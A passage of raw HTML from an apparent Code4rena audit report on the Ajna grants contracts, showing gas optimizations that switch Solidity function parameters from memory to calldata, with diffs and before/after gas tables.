class=\"mtk7\">+        FundingVoteParams calldata voteParams_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) internal returns (uint256 incrementalVotesUsed_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint8  support = 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 proposalId = proposal_.proposalId;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L572-L574\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L572-L574</a></p>\n<p><em>Gas Savings for <code>GrantFund.screeningVote</code>, obtained via protocol’s tests: Avg 2678 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>399146</td>\n</tr>\n<tr>\n<td>After</td>\n<td>396468</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"121\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">572</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">screeningVote</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">573:        </span><span class=\"mtk10\">ScreeningVoteParams</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">voteParams_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">574</span><span class=\"mtk1\">:    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votesCast_</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"122\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 928b337..550cf53 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -570,7 +570,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @inheritdoc IStandardFunding</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function screeningVote(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        ScreeningVoteParams[] memory voteParams_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        ScreeningVoteParams[] calldata voteParams_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) external override returns (uint256 votesCast_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         QuarterlyDistribution memory currentDistribution = _distributions[_currentDistributionId];</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/GrantFund.sol#L22-L27\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/GrantFund.sol#L22-L27</a></p>\n<p><em>Gas Savings for <code>GrantFund.hashProposal</code>, obtained via protocol’s tests: Avg 127 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>3843</td>\n</tr>\n<tr>\n<td>After</td>\n<td>3716</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"123\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GrantFund</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">22</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">hashProposal</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">23:        </span><span class=\"mtk10\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">targets_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">24:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">values_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">25:        </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">calldatas_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">26:        </span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk10\">descriptionHash_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">27</span><span class=\"mtk1\">:    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"124\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/GrantFund.sol b/src/grants/GrantFund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 3d568b0..4c21753 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/GrantFund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/GrantFund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -20,9 +20,9 @@ contract GrantFund is IGrantFund, ExtraordinaryFunding, StandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @inheritdoc IGrantFund</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function hashProposal(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        address[] memory targets_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256[] memory values_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        bytes[] memory calldatas_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address[] calldata targets_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256[] calldata values_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        bytes[] calldata calldatas_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         bytes32 descriptionHash_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) external pure override returns (uint256 proposalId_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         proposalId_ = _hashProposal(targets_, values_, calldatas_, descriptionHash_);</span></span></span></code></pre>\n<p>The instances below do not save a lot of gas because they each call <code>_hashProposal</code>, which loads all the calldata arrays into memory so even if all the parameters are set to <code>calldata</code> they will all eventually be loaded into memory in the <code>_hashProposal</code>. In addition, some parameters in <code>proposeStandard</code> must stay as <code>memory</code> due to <code>stack too deep</code> errors.</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/Funding.sol#L52-L57\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/Funding.sol#L52-L57</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L56-L61\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L56-L61</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L343-L348\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L343-L348</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L366-L371\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L366-L371</a></p>\n<p><em>Gas Savings for <code>GrantFund.executeExtraordinary</code>, obtained via protocol’s tests: Avg 64 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>95823</td>\n</tr>\n<tr>\n<td>After</td>\n<td>95759</td>\n</tr>\n</tbody>\n</table>\n<p><em>Gas Savings for <code>GrantFund.executeStandard</code>, obtained via protocol’s tests: Avg 64 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>47894</td>\n</tr>\n<tr>\n<td>After</td>\n<td>47830</td>\n</tr>\n</tbody>\n</table>\n<p><em>Gas Savings for <code>GrantFund.proposeStandard</code>, obtained via protocol’s tests: Avg 46 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>82900</td>\n</tr>\n<tr>\n<td>After</td>\n<td>82854</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"125\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Funding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">52</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_execute</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">53:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">proposalId_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">54:        </span><span class=\"mtk10\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">targets_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">55:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">values_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">56:        </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">calldatas_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">57</span><span class=\"mtk1\">:    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">56</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">executeExtraordinary</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">57:        </span><span class=\"mtk10\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">targets_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">58:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">values_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">59:        </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">calldatas_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">60:        </span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk10\">descriptionHash_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">61</span><span class=\"mtk1\">:    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">343</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">executeStandard</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">344:        </span><span class=\"mtk10\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">targets_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">345:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">values_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">346:        </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">calldatas_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">347:        </span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk10\">descriptionHash_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">348</span><span class=\"mtk1\">:    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">366</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">proposeStandard</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">367:        </span><span class=\"mtk10\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">targets_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">368:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">values_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">369:        </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">calldatas_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">370:        </span><span class=\"mtk10\">string</span><span class=\"mtk1\"> </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">description_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">371</span><span class=\"mtk1\">:    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"126\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/Funding.sol b/src/grants/base/Funding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 72fafb9..d5c58d1 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/Funding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/Funding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -51,9 +51,9 @@ abstract contract Funding is IFunding, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function _execute(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 proposalId_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        address[] memory targets_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256[] memory values_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        bytes[] memory calldatas_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address[] calldata targets_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256[] calldata values_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        bytes[] calldata calldatas_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) internal {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // use common event name to maintain consistency with tally</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         emit ProposalExecuted(proposalId_);</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"127\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/ExtraordinaryFunding.sol b/src/grants/base/ExtraordinaryFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 4a70abb..43bba61 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/ExtraordinaryFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/ExtraordinaryFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -54,9 +54,9 @@ abstract contract ExtraordinaryFunding is Funding, IExtraordinaryFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @inheritdoc IExtraordinaryFunding</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function executeExtraordinary(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        address[] memory targets_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256[] memory values_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        bytes[] memory calldatas_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address[] calldata targets_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256[] calldata values_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        bytes[] calldata calldatas_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         bytes32 descriptionHash_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) external nonReentrant override returns (uint256 proposalId_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, descriptionHash_)));</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"128\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 928b337..ceef9f5 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -341,9 +341,9 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @inheritdoc IStandardFunding</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function executeStandard(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        address[] memory targets_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256[] memory values_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        bytes[] memory calldatas_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address[] calldata targets_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256[] calldata values_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        bytes[] calldata calldatas_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         bytes32 descriptionHash_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) external nonReentrant override returns (uint256 proposalId_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_STANDARD, descriptionHash_)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -364,8 +364,8 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @inheritdoc IStandardFunding</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function proposeStandard(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        address[] memory targets_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256[] memory values_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address[] calldata targets_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256[] calldata values_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         bytes[] memory calldatas_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         string memory description_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) external override returns (uint256 proposalId_) {</span></span></span></code></pre>\n<h2 id=\"g-02-state-variables-can-be-cached-instead-of-re-reading-them-from-storage\" style=\"position:relative;\"><a href=\"#g-02-state-variables-can-be-cached-instead-of-re-reading-them-from-storage\" aria-label=\"g 02 state variables can be cached instead of re reading them from storage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 